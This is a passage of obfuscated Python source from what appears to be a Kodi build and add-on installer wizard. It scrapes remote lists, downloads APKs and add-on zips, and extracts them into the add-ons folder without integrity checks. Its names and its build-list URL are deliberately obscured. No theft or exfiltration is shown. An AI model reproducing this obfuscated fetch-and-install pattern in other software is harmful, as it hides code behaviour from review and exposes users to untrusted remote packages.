				if O0OO000O0OO0O0O0O >0 :#line:1533
					OOOOOO0O00000O00O ='+'if SHOW18 =='false'else '-'#line:1534
					if SHOW18 =='true':#line:1536
						for OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ,O0O00O0OO000O00OO ,O0OOOOOOOOO0OO0O0 ,O0O0000OOOOOOOO0O ,O0OO00O00OO00000O ,O00000000000000OO ,O0OOOOOOOOO000O0O ,OO0O0OO0OO0OO0000 ,OOOOOOO0OOOOO0OO0 in OO00O0OO00O000O00 :#line:1538
							if not SHOWADULT =='true'and OO0O0OO0OO0OO0000 .lower ()=='yes':continue #line:1539
							if not DEVELOPER =='true'and wiz .strTest (OO00O0000OO0O0O0O ):continue #line:1540
							OOOO0OOOOOOO000OO =int (float (O0O0000OOOOOOOO0O ))#line:1541
							if OOOO0OOOOOOO000OO ==18 :#line:1542
								OO0O0O00OO0O0OO0O =createMenu ('install','',OO00O0000OO0O0O0O )#line:1543
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOOOOOOO0O ),OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ),'viewbuild',OO00O0000OO0O0O0O ,description =OOOOOOO0OOOOO0OO0 ,fanart =O0OOOOOOOOO000O0O ,icon =O00000000000000OO ,menu =OO0O0O00OO0O0OO0O ,themeit =THEME2 )#line:1544
				if O0OO0000OOO000OOO >0 :#line:1545
					OOOOOO0O00000O00O ='+'if SHOW16 =='false'else '-'#line:1546
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOOOO0O00000O00O ,O0OO0000OOO000OOO ),'togglesetting','show16',themeit =THEME3 )#line:1547
					if SHOW16 =='true':#line:1548
						for OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ,O0O00O0OO000O00OO ,O0OOOOOOOOO0OO0O0 ,O0O0000OOOOOOOO0O ,O0OO00O00OO00000O ,O00000000000000OO ,O0OOOOOOOOO000O0O ,OO0O0OO0OO0OO0000 ,OOOOOOO0OOOOO0OO0 in OO00O0OO00O000O00 :#line:1549
							if not SHOWADULT =='true'and OO0O0OO0OO0OO0000 .lower ()=='yes':continue #line:1550
							if not DEVELOPER =='true'and wiz .strTest (OO00O0000OO0O0O0O ):continue #line:1551
							OOOO0OOOOOOO000OO =int (float (O0O0000OOOOOOOO0O ))#line:1552
							if OOOO0OOOOOOO000OO ==16 :#line:1553
								OO0O0O00OO0O0OO0O =createMenu ('install','',OO00O0000OO0O0O0O )#line:1554
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOOOOOOO0O ),OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ),'viewbuild',OO00O0000OO0O0O0O ,description =OOOOOOO0OOOOO0OO0 ,fanart =O0OOOOOOOOO000O0O ,icon =O00000000000000OO ,menu =OO0O0O00OO0O0OO0O ,themeit =THEME2 )#line:1555
				if OOO000OOOO0O0OO00 >0 :#line:1556
					OOOOOO0O00000O00O ='+'if SHOW15 =='false'else '-'#line:1557
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOOOO0O00000O00O ,OOO000OOOO0O0OO00 ),'togglesetting','show15',themeit =THEME3 )#line:1558
					if SHOW15 =='true':#line:1559
						for OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ,O0O00O0OO000O00OO ,O0OOOOOOOOO0OO0O0 ,O0O0000OOOOOOOO0O ,O0OO00O00OO00000O ,O00000000000000OO ,O0OOOOOOOOO000O0O ,OO0O0OO0OO0OO0000 ,OOOOOOO0OOOOO0OO0 in OO00O0OO00O000O00 :#line:1560
							if not SHOWADULT =='true'and OO0O0OO0OO0OO0000 .lower ()=='yes':continue #line:1561
							if not DEVELOPER =='true'and wiz .strTest (OO00O0000OO0O0O0O ):continue #line:1562
							OOOO0OOOOOOO000OO =int (float (O0O0000OOOOOOOO0O ))#line:1563
							if OOOO0OOOOOOO000OO <=15 :#line:1564
								OO0O0O00OO0O0OO0O =createMenu ('install','',OO00O0000OO0O0O0O )#line:1565
								addDir ('[%s] %s (v%s)'%(float (O0O0000OOOOOOOO0O ),OO00O0000OO0O0O0O ,O000O0O00OOO00O0O ),'viewbuild',OO00O0000OO0O0O0O ,description =OOOOOOO0OOOOO0OO0 ,fanart =O0OOOOOOOOO000O0O ,icon =O00000000000000OO ,menu =OO0O0O00OO0O0OO0O ,themeit =THEME2 )#line:1566
		elif OOO0O0000O000OOO0 >0 :#line:1567
			if OO000000OO00O0OO0 >0 :#line:1568
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1569
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1570
			else :#line:1571
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1572
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1573
	setView ('files','viewType')#line:1574
def viewBuild (OO0O0OOOOO0OOOOOO ):#line:1576
    OO00000OOOO0O0OOO =wiz .workingURL (ld (BL ))#line:1583
    if not OO00000OOOO0O0OOO ==True :#line:1584
        addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1585
        addFile ('%s'%OO00000OOOO0O0OOO ,'',themeit =THEME3 )#line:1586
        return #line:1587
    if wiz .checkBuild (OO0O0OOOOO0OOOOOO ,'version')==False :#line:1588
        addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1589
        addFile ('%s was not found in the builds list.'%OO0O0OOOOO0OOOOOO ,'',themeit =THEME3 )#line:1590
        return #line:1591
    OO0OO00OO0OO0O0O0 =wiz .openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1592
    OOO0OOO000OOOO00O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0O0OOOOO0OOOOOO ).findall (OO0OO00OO0OO0O0O0 )#line:1593
    for O000000OO00O0O0O0 ,O0O00OOOO000O0000 ,OO0000OO0O000O00O ,OO0O0OO0O0000O00O ,O00O00OO0O0O0OO0O ,OO00OO000OOO0OO0O ,OOO0OO00OO00O00O0 ,OOO000000O00OOOOO ,O0000O0OO000OO0OO ,O000000000O0OO0O0 in OOO0OOO000OOOO00O :#line:1594
        OO00OO000OOO0OO0O =OO00OO000OOO0OO0O if wiz .workingURL (OO00OO000OOO0OO0O )else ICON #line:1596
        OOO0OO00OO00O00O0 =OOO0OO00OO00O00O0 if wiz .workingURL (OOO0OO00OO00O00O0 )else FANART #line:1597
        OO0O00OO0O0OOOOO0 ='%s (v%s)'%(OO0O0OOOOO0OOOOOO ,O000000OO00O0O0O0 )#line:1598
        if BUILDNAME ==OO0O0OOOOO0OOOOOO and O000000OO00O0O0O0 >BUILDVERSION :#line:1599
            OO0O00OO0O0OOOOO0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0O00OO0O0OOOOO0 ,BUILDVERSION )#line:1600
        O00OO0O0000000O00 =int (float (KODIV ));O00O0OOO0OO00O00O =int (float (OO0O0OO0O0000O00O ))#line:1609
        if not O00OO0O0000000O00 ==O00O0OOO0OO00O00O :#line:1610
            if O00OO0O0000000O00 ==16 and O00O0OOO0OO00O00O <=15 :OO0O0OOOOO000OO00 =False #line:1611
            else :OO0O0OOOOO000OO00 =True #line:1612
        else :OO0O0OOOOO000OO00 =False #line:1613
        addFile ('התקנה','install',OO0O0OOOOO0OOOOOO ,'fresh',description =O000000000O0OO0O0 ,fanart =OOO0OO00OO00O00O0 ,icon =OO00OO000OOO0OO0O ,themeit =THEME1 )#line:1617
        if not O00O00OO0O0O0OO0O =='http://':#line:1620
            if wiz .workingURL (O00O00OO0O0O0OO0O )==True :#line:1621
                addFile (wiz .sep ('THEMES'),'',fanart =OOO0OO00OO00O00O0 ,icon =OO00OO000OOO0OO0O ,themeit =THEME3 )#line:1622
                OO0OO00OO0OO0O0O0 =wiz .openURL (O00O00OO0O0O0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1623
                OOO0OOO000OOOO00O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO00OO0OO0O0O0 )#line:1624
                for OO00OO0O000O0OO0O ,O0OOO0OO0OOOO0OO0 ,O00OO00OO00O0O000 ,O0O0OO0OO0O0OOO0O ,O000O00O0O0000OO0 ,O000000000O0OO0O0 in OOO0OOO000OOOO00O :#line:1625
                    if not SHOWADULT =='true'and O000O00O0O0000OO0 .lower ()=='yes':continue #line:1626
                    O00OO00OO00O0O000 =O00OO00OO00O0O000 if O00OO00OO00O0O000 =='http://'else OO00OO000OOO0OO0O #line:1627
                    O0O0OO0OO0O0OOO0O =O0O0OO0OO0O0OOO0O if O0O0OO0OO0O0OOO0O =='http://'else OOO0OO00OO00O00O0 #line:1628
                    addFile (OO00OO0O000O0OO0O if not OO00OO0O000O0OO0O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO00OO0O000O0OO0O ,'theme',OO0O0OOOOO0OOOOOO ,OO00OO0O000O0OO0O ,description =O000000000O0OO0O0 ,fanart =O0O0OO0OO0O0OOO0O ,icon =O00OO00OO00O0O000 ,themeit =THEME3 )#line:1629
    setView ('files','viewType')#line:1630
def apkScraper (name =""):#line:1635
	if name =='kodi':#line:1636
		OO0OO0OOO0000OO0O ='http://mirrors.kodi.tv/releases/android/arm/'#line:1637
		OO0O0O00O000OO0O0 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:1638
		OOOOOOO00O00OOOO0 =wiz .openURL (OO0OO0OOO0000OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1639
		O000O0O00OO000O0O =wiz .openURL (OO0O0O00O000OO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1640
		O000O0OOOOO000000 =0 #line:1641
		OOOO0000OO00OO00O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOOOO00O00OOOO0 )#line:1642
		O0000000OOO00OO0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000O0O00OO000O0O )#line:1643
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:1645
		O0OOOOOO00OO00OOO =False #line:1646
		for OOO0OO0OOO00O000O ,name ,O000OOO0O000O0O0O ,O0OO000OO000OOOO0 in OOOO0000OO00OO00O :#line:1647
			if OOO0OO0OOO00O000O in ['../','old/']:continue #line:1648
			if not OOO0OO0OOO00O000O .endswith ('.apk'):continue #line:1649
			if not OOO0OO0OOO00O000O .find ('_')==-1 and O0OOOOOO00OO00OOO ==True :continue #line:1650
			try :#line:1651
				OO0OOOOOO00OOO00O =name .split ('-')#line:1652
				if not OOO0OO0OOO00O000O .find ('_')==-1 :#line:1653
					O0OOOOOO00OO00OOO =True #line:1654
					O000000OOO0OO00OO ,O00O0O0O0O000O0OO =OO0OOOOOO00OOO00O [2 ].split ('_')#line:1655
				else :#line:1656
					O000000OOO0OO00OO =OO0OOOOOO00OOO00O [2 ]#line:1657
					O00O0O0O0O000O0OO =''#line:1658
				OO00000OO00OO00OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOOOO00OOO00O [0 ].title (),OO0OOOOOO00OOO00O [1 ],O00O0O0O0O000O0OO .upper (),O000000OOO0OO00OO ,COLOR2 ,O000OOO0O000O0O0O .replace (' ',''),COLOR1 ,O0OO000OO000OOOO0 )#line:1659
				OOOOOOOO0000OO00O =urljoin (OO0OO0OOO0000OO0O ,OOO0OO0OOO00O000O )#line:1660
				addFile (OO00000OO00OO00OO ,'apkinstall',"%s v%s%s %s"%(OO0OOOOOO00OOO00O [0 ].title (),OO0OOOOOO00OOO00O [1 ],O00O0O0O0O000O0OO .upper (),O000000OOO0OO00OO ),OOOOOOOO0000OO00O )#line:1661
				O000O0OOOOO000000 +=1 #line:1662
			except :#line:1663
				wiz .log ("Error on: %s"%name )#line:1664
		for OOO0OO0OOO00O000O ,name ,O000OOO0O000O0O0O ,O0OO000OO000OOOO0 in O0000000OOO00OO0O :#line:1666
			if OOO0OO0OOO00O000O in ['../','old/']:continue #line:1667
			if not OOO0OO0OOO00O000O .endswith ('.apk'):continue #line:1668
			if not OOO0OO0OOO00O000O .find ('_')==-1 :continue #line:1669
			try :#line:1670
				OO0OOOOOO00OOO00O =name .split ('-')#line:1671
				OO00000OO00OO00OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOOOOO00OOO00O [0 ].title (),OO0OOOOOO00OOO00O [1 ],OO0OOOOOO00OOO00O [2 ],COLOR2 ,O000OOO0O000O0O0O .replace (' ',''),COLOR1 ,O0OO000OO000OOOO0 )#line:1672
				OOOOOOOO0000OO00O =urljoin (OO0O0O00O000OO0O0 ,OOO0OO0OOO00O000O )#line:1673
				addFile (OO00000OO00OO00OO ,'apkinstall',"%s v%s %s"%(OO0OOOOOO00OOO00O [0 ].title (),OO0OOOOOO00OOO00O [1 ],OO0OOOOOO00OOO00O [2 ]),OOOOOOOO0000OO00O )#line:1674
				O000O0OOOOO000000 +=1 #line:1675
			except :#line:1676
				wiz .log ("Error on: %s"%name )#line:1677
		if O000O0OOOOO000000 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:1678
	elif name =='spmc':#line:1679
		O000OOOO00O0O0OOO ='https://github.com/koying/SPMC/releases'#line:1680
		OOOOOOO00O00OOOO0 =wiz .openURL (O000OOOO00O0O0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1681
		O000O0OOOOO000000 =0 #line:1682
		OOOO0000OO00OO00O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOOOOO00O00OOOO0 )#line:1683
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:1685
		for name ,O0OO0O0O0000000O0 in OOOO0000OO00OO00O :#line:1687
			O0O000O0OO0O000O0 =''#line:1688
			O0000000OOO00OO0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OO0O0O0000000O0 )#line:1689
			for O000OOO0OOO00O0O0 ,OO00O00000000OO0O ,O0O0000OO0OO0OO00 in O0000000OOO00OO0O :#line:1690
				if O0O0000OO0OO0OO00 .find ('armeabi')==-1 :continue #line:1691
				if O0O0000OO0OO0OO00 .find ('launcher')>-1 :continue #line:1692
				O0O000O0OO0O000O0 =urljoin ('https://github.com',O000OOO0OOO00O0O0 )#line:1693
				break #line:1694
		if O000O0OOOOO000000 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:1696
def apkMenu (url =None ):#line:1698
	if url ==None :#line:1699
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1702
	if not APKFILE =='http://':#line:1703
		if url ==None :#line:1704
			OOO00OO000OO0OOO0 =wiz .workingURL (APKFILE )#line:1705
			O0O0OO00O0000O0OO =uservar .APKFILE #line:1706
		else :#line:1707
			OOO00OO000OO0OOO0 =wiz .workingURL (url )#line:1708
			O0O0OO00O0000O0OO =url #line:1709
		if OOO00OO000OO0OOO0 ==True :#line:1710
			O00O0O000OOO0000O =wiz .openURL (O0O0OO00O0000O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1711
			OOOO0OOO000OOOOOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0O000OOO0000O )#line:1712
			if len (OOOO0OOO000OOOOOO )>0 :#line:1713
				OOO00OO00OO0O0000 =0 #line:1714
				for OO000000O0O0O0OOO ,OOOO000O0OOOO0OO0 ,url ,O0OOO000O00O0O0O0 ,O00O000O00O000O00 ,O00O00OO00O0OO000 ,O0O0OO00OO0O0O00O in OOOO0OOO000OOOOOO :#line:1715
					if not SHOWADULT =='true'and O00O00OO00O0OO000 .lower ()=='yes':continue #line:1716
					if OOOO000O0OOOO0OO0 .lower ()=='yes':#line:1717
						OOO00OO00OO0O0000 +=1 #line:1718
						addDir ("[B]%s[/B]"%OO000000O0O0O0OOO ,'apk',url ,description =O0O0OO00OO0O0O00O ,icon =O0OOO000O00O0O0O0 ,fanart =O00O000O00O000O00 ,themeit =THEME3 )#line:1719
					else :#line:1720
						OOO00OO00OO0O0000 +=1 #line:1721
						addFile (OO000000O0O0O0OOO ,'apkinstall',OO000000O0O0O0OOO ,url ,description =O0O0OO00OO0O0O00O ,icon =O0OOO000O00O0O0O0 ,fanart =O00O000O00O000O00 ,themeit =THEME2 )#line:1722
					if OOO00OO00OO0O0000 <1 :#line:1723
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:1724
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",5 )#line:1725
		else :#line:1726
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",5 )#line:1727
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:1728
			addFile ('%s'%OOO00OO000OO0OOO0 ,'',themeit =THEME3 )#line:1729
		return #line:1730
	else :wiz .log ("[APK Menu] No APK list added.")#line:1731
	setView ('files','viewType')#line:1732
def addonMenu (url =None ):#line:1734
	if not ADDONFILE =='http://':#line:1735
		if url ==None :#line:1736
			OOOOOO0O00000O000 =wiz .workingURL (ADDONFILE )#line:1737
			OO0OO000OO000O00O =uservar .ADDONFILE #line:1738
		else :#line:1739
			OOOOOO0O00000O000 =wiz .workingURL (url )#line:1740
			OO0OO000OO000O00O =url #line:1741
		if OOOOOO0O00000O000 ==True :#line:1742
			O0O0OOOO0000OO00O =wiz .openURL (OO0OO000OO000O00O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:1743
			O0O000O00O0O0O0OO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO0000OO00O )#line:1744
			if len (O0O000O00O0O0O0OO )>0 :#line:1745
				O0OO0OO0000OOO00O =0 #line:1746
				for OOO00OOO000000000 ,O00O00O000OOOO00O ,url ,O00OOOOOOOOO0O00O ,OOO0O0OOOOO00OO00 ,O0OO00O00OO0OOOOO ,O0OO0OOO0O00OOO00 ,OO00O00OOO0O0O00O ,O0000OO00OOOOOOOO ,O00000OOOO000000O in O0O000O00O0O0O0OO :#line:1747
					if O00O00O000OOOO00O .lower ()=='section':#line:1748
						O0OO0OO0000OOO00O +=1 #line:1749
						addDir ("[B]%s[/B]"%OOO00OOO000000000 ,'addons',url ,description =O00000OOOO000000O ,icon =O0OO0OOO0O00OOO00 ,fanart =OO00O00OOO0O0O00O ,themeit =THEME3 )#line:1750
					else :#line:1751
						if not SHOWADULT =='true'and O0000OO00OOOOOOOO .lower ()=='yes':continue #line:1752
						try :#line:1753
							OO000O000000OOO00 =xbmcaddon .Addon (id =O00O00O000OOOO00O ).getAddonInfo ('path')#line:1754
							if os .path .exists (OO000O000000OOO00 ):#line:1755
								OOO00OOO000000000 ="[COLOR green][Installed][/COLOR] %s"%OOO00OOO000000000 #line:1756
						except :#line:1757
							pass #line:1758
						O0OO0OO0000OOO00O +=1 #line:1759
						addFile (OOO00OOO000000000 ,'addoninstall',O00O00O000OOOO00O ,OO0OO000OO000O00O ,description =O00000OOOO000000O ,icon =O0OO0OOO0O00OOO00 ,fanart =OO00O00OOO0O0O00O ,themeit =THEME2 )#line:1760
					if O0OO0OO0000OOO00O <1 :#line:1761
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:1762
			else :#line:1763
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:1764
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:1765
		else :#line:1766
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:1767
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:1768
			addFile ('%s'%OOOOOO0O00000O000 ,'',themeit =THEME3 )#line:1769
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:1770
	setView ('files','viewType')#line:1771
def addonInstaller (OOO0000OOOO00OOOO ,O0O0OOOOOOO0O00OO ):#line:1773
	if not ADDONFILE =='http://':#line:1774
		OO0O0OO0OO0000O00 =wiz .workingURL (O0O0OOOOOOO0O00OO )#line:1775
		if OO0O0OO0OO0000O00 ==True :#line:1776
			OOO00OO0OOOO0OO00 =wiz .openURL (O0O0OOOOOOO0O00OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:1777
			O0O0000000OO0OOOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO0000OOOO00OOOO ).findall (OOO00OO0OOOO0OO00 )#line:1778
			if len (O0O0000000OO0OOOO )>0 :#line:1779
				for OO0OO00O00OOOOOOO ,O0O0OOOOOOO0O00OO ,OO0OO0000OO0OOOO0 ,OO0O0O00O0O000O00 ,O0O0OOO00OO0O00OO ,OO00000O0000O0OO0 ,O000O0OO0O0O0O000 ,O00OOOOO0000O0O0O ,OOOOO0000000OO00O in O0O0000000OO0OOOO :#line:1780
					if os .path .exists (os .path .join (ADDONS ,OOO0000OOOO00OOOO )):#line:1781
						OOO00OO0OO0O0O0OO =['Launch Addon','Remove Addon']#line:1782
						O0000O00O00O0OOO0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO00OO0OO0O0O0OO )#line:1783
						if O0000O00O00O0OOO0 ==0 :#line:1784
							wiz .ebi ('RunAddon(%s)'%OOO0000OOOO00OOOO )#line:1785
							xbmc .sleep (1000 )#line:1786
							return True #line:1787
						elif O0000O00O00O0OOO0 ==1 :#line:1788
							wiz .cleanHouse (os .path .join (ADDONS ,OOO0000OOOO00OOOO ))#line:1789
							try :wiz .removeFolder (os .path .join (ADDONS ,OOO0000OOOO00OOOO ))#line:1790
							except :pass #line:1791
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO0000OOOO00OOOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:1792
								removeAddonData (OOO0000OOOO00OOOO )#line:1793
							wiz .refresh ()#line:1794
							return True #line:1795
						else :#line:1796
							return False #line:1797
					OO0O00O00O0O0OOO0 =os .path .join (ADDONS ,OO0OO0000OO0OOOO0 )#line:1798
					if not OO0OO0000OO0OOOO0 .lower ()=='none'and not os .path .exists (OO0O00O00O0O0OOO0 ):#line:1799
						wiz .log ("Repository not installed, installing it")#line:1800
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOO0000OOOO00OOOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OO0000OO0OOOO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:1801
							O0O0000O000O00000 =wiz .parseDOM (wiz .openURL (OO0O0O00O0O000O00 ),'addon',ret ='version',attrs ={'id':OO0OO0000OO0OOOO0 })#line:1802
							if len (O0O0000O000O00000 )>0 :#line:1803
								OO0OOOO0OO00O00OO ='%s%s-%s.zip'%(O0O0OOO00OO0O00OO ,OO0OO0000OO0OOOO0 ,O0O0000O000O00000 [0 ])#line:1804
								wiz .log (OO0OOOO0OO00O00OO )#line:1805
								if KODIV >=17 :wiz .addonDatabase (OO0OO0000OO0OOOO0 ,1 )#line:1806
								installAddon (OO0OO0000OO0OOOO0 ,OO0OOOO0OO00O00OO )#line:1807
								wiz .ebi ('UpdateAddonRepos()')#line:1808
								wiz .log ("Installing Addon from Kodi")#line:1810
								O00000O0O00OOOO0O =installFromKodi (OOO0000OOOO00OOOO )#line:1811
								wiz .log ("Install from Kodi: %s"%O00000O0O00OOOO0O )#line:1812
								if O00000O0O00OOOO0O :#line:1813
									wiz .refresh ()#line:1814
									return True #line:1815
							else :#line:1816
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0OO0000OO0OOOO0 )#line:1817
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOO0000OOOO00OOOO ,OO0OO0000OO0OOOO0 ))#line:1818
					elif OO0OO0000OO0OOOO0 .lower ()=='none':#line:1819
						wiz .log ("No repository, installing addon")#line:1820
						OO0OO0O0OO0O00OOO =OOO0000OOOO00OOOO #line:1821
						O0O00OO0OO0O00OO0 =O0O0OOOOOOO0O00OO #line:1822
						installAddon (OOO0000OOOO00OOOO ,O0O0OOOOOOO0O00OO )#line:1823
						wiz .refresh ()#line:1824
						return True #line:1825
					else :#line:1826
						wiz .log ("Repository installed, installing addon")#line:1827
						O00000O0O00OOOO0O =installFromKodi (OOO0000OOOO00OOOO ,False )#line:1828
						if O00000O0O00OOOO0O :#line:1829
							wiz .refresh ()#line:1830
							return True #line:1831
					if os .path .exists (os .path .join (ADDONS ,OOO0000OOOO00OOOO )):return True #line:1832
					OOO0O0OOO0OOO0OO0 =wiz .parseDOM (wiz .openURL (OO0O0O00O0O000O00 ),'addon',ret ='version',attrs ={'id':OOO0000OOOO00OOOO })#line:1833
					if len (OOO0O0OOO0OOO0OO0 )>0 :#line:1834
						O0O0OOOOOOO0O00OO ="%s%s-%s.zip"%(O0O0OOOOOOO0O00OO ,OOO0000OOOO00OOOO ,OOO0O0OOO0OOO0OO0 [0 ])#line:1835
						wiz .log (str (O0O0OOOOOOO0O00OO ))#line:1836
						if KODIV >=17 :wiz .addonDatabase (OOO0000OOOO00OOOO ,1 )#line:1837
						installAddon (OOO0000OOOO00OOOO ,O0O0OOOOOOO0O00OO )#line:1838
						wiz .refresh ()#line:1839
					else :#line:1840
						wiz .log ("no match");return False #line:1841
			else :wiz .log ("[Addon Installer] Invalid Format")#line:1842
		else :wiz .log ("[Addon Installer] Text File: %s"%OO0O0OO0OO0000O00 )#line:1843
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:1844
def installFromKodi (O000O00OO0OO0OOO0 ,over =True ):#line:1846
	if over ==True :#line:1847
		xbmc .sleep (2000 )#line:1848
	wiz .ebi ('RunPlugin(plugin://%s)'%O000O00OO0OO0OOO0 )#line:1850
	if not wiz .whileWindow ('yesnodialog'):#line:1851
		return False #line:1852
	xbmc .sleep (1000 )#line:1853
	if wiz .whileWindow ('okdialog'):#line:1854
		return False #line:1855
	wiz .whileWindow ('progressdialog')#line:1856
	if os .path .exists (os .path .join (ADDONS ,O000O00OO0OO0OOO0 )):return True #line:1857
	else :return False #line:1858
def installAddon (OO0OO0O0000O00OO0 ,OO000OO0OOO0O0OOO ):#line:1860
	if not wiz .workingURL (OO000OO0OOO0O0OOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0OO0O0000O00OO0 ,COLOR2 ));return #line:1861
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:1862
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O00OO0 )+'\n'+''+'\n'+'[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:1863
	OO0O0OOO0O0OO0OOO =OO000OO0OOO0O0OOO .split ('/')#line:1864
	O0O0OO0O00O00OOOO =os .path .join (PACKAGES ,OO0O0OOO0O0OO0OOO [-1 ])#line:1865
	try :os .remove (O0O0OO0O00O00OOOO )#line:1866
	except :pass #line:1867
	downloader .download (OO000OO0OOO0O0OOO ,O0O0OO0O00O00OOOO ,DP )#line:1868
	O0000OO00O0OO000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O00OO0 )#line:1869
	DP .update (0 ,O0000OO00O0OO000O +'\n'+''+'\n'+'[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:1870
	OOOO0000OO00O0O0O ,O00O0OO0OO00OO0O0 ,O000O0000OOO0OO0O =extract .all (O0O0OO0O00O00OOOO ,ADDONS ,DP ,title =O0000OO00O0OO000O )#line:1871
	DP .update (0 ,O0000OO00O0OO000O +'\n'+''+'\n'+'[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:1872
	installed (OO0OO0O0000O00OO0 )#line:1873
	installDep (OO0OO0O0000O00OO0 ,DP )#line:1874
	DP .close ()#line:1875
